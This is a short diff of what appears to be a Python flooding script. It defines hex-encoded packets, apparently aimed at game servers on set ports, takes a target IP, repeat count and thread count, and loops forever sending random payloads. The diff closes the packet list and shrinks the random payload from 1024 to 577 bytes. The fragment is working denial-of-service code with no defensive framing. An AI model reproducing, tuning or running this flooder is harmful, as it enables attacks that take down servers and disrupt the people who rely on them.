@@ -41,6 +41,7 @@ Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        codecs.decode("021efd40","hex_codec"),#cookie port 7784
                        codecs.decode("021efd40","hex_codec"),#cookie port 1111 
                        codecs.decode("081e7eda","hex_codec")#cookie port 1111
+	               ]
 
 ap = argparse.ArgumentParser()
 ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
@@ -65,7 +66,7 @@ times = args['times']
 threads = args['threads']
 
 def run():
-	data = random._urandom(1024)
+	data = random._urandom(577)
 	i = random.choice(("[*]","[!]","[#]"))
 	while True:
 		try:
